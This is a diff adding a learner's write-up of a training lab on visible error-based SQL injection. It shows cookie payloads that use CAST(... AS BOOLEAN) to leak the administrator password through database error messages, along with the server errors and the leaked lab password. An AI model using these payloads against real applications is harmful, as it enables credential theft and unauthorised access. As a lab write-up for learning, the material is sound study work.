@@ -1,0 +1,31 @@
+Lab #1 - Visible error-based SQL injection
+
+Vulnerability - This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
+
+Goal - The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.
+
+Analysis:
+1. When injecting a SQL query to TrackingId:
+Cookie: TrackingId=MwvUjCR6Tq3eABD0' AND CAST(555 AS int);
+=> It returns verbose error message in the response: 
+ERROR: argument of AND must be type boolean, not type integer
+  Position: 63
+
+2. Construct a SQL query to retrieve password of administrator
+SELECT password FROM users WHERE username='administrator'
+
+=> The password returned from server is a string so using CAST function to cast it into int
+CAST((SELECT password FROM users WHERE username='administrator') AS BOOLEAN)
+
+=> Inject this query into TrackingId and send the request to server
+Cookie: TrackingId=MwvUjCR6Tq3eABD0' AND CAST((SELECT password FROM users WHERE username='administrator') AS BOOLEAN) --
+Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'MwvUjCR6Tq3eABD0' AND CAST((SELECT password FROM users WHERE'. Expected  char
+=> A character limit prevents me from triggering conditional responses.
+
+3. Try a shorter query to retrieve password from users table, and predict that administrator is on the top in alphabetical order
+Cookie: TrackingId=MwvUjCR6Tq3eABD0' AND CAST((SELECT password FROM users LIMIT 1) AS BOOLEAN) --
+=> ERROR: Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'MwvUjCR6Tq3eABD0' AND CAST((SELECT password FROM users LIMIT'. Expected  char
+=> try to reduce the length of this query as much as possible:
+Cookie: TrackingId=' AND CAST((SELECT password FROM users LIMIT 1)AS BOOLEAN)--; 
+
+=> SUCESSFULLY: ERROR: invalid input syntax for type boolean: "mdzmrz2rfjrl36w1q48o"
